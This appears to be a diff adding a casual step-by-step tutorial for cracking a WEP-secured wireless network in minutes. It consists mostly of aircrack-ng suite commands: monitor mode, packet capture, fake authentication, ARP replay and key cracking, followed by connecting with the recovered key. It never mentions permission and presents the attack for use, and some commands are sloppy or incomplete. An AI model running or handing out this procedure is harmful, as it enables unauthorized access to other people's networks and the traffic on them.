@@ -1,0 +1,35 @@
+To start check if your adapter allows packet injection:
+aireplay -9 mon0
+
+#################
+#~ The Hacking ~#
+#################
+
+We need to put our wireless interface into monitor mode by doing:
+airmon-ng start wlan0
+Your interface could posibly be differnt.
+
+Now lets capture the networks using airodump:
+airodump-ng mon0
+
+So, lets start listening to our wep network,
+airodump-ng -c <channel> -w <file> --bssid 00:00:xxxx <interface>
+
+Now we need to authenticate the network;
+aireplay-ng -1 0 -a 00:00:00:00 <interface>
+
+Ok same command again just differnt syntax:
+aireplay-ng -3 -b 00:00:00:00 <interface>
+
+Awsome so now we need to prompt a new terminal using the file 
+we last set when we were listening to the network it should end with .cap:
+aircrack-ng <file>
+
+Ok this could take a few minutes to get enough data to crack the password.
+
+KEY FOUND! [11:111:11:11] << coool!!!! but not done ;)
+
+Connecting to the network, once asked for the password you enter the "11:111:11:11" but delete 
+everyone of the ':' so; 11:111:11:11 = 111111111
+
+And thats it for cracking a wep network under 5 minutes :)
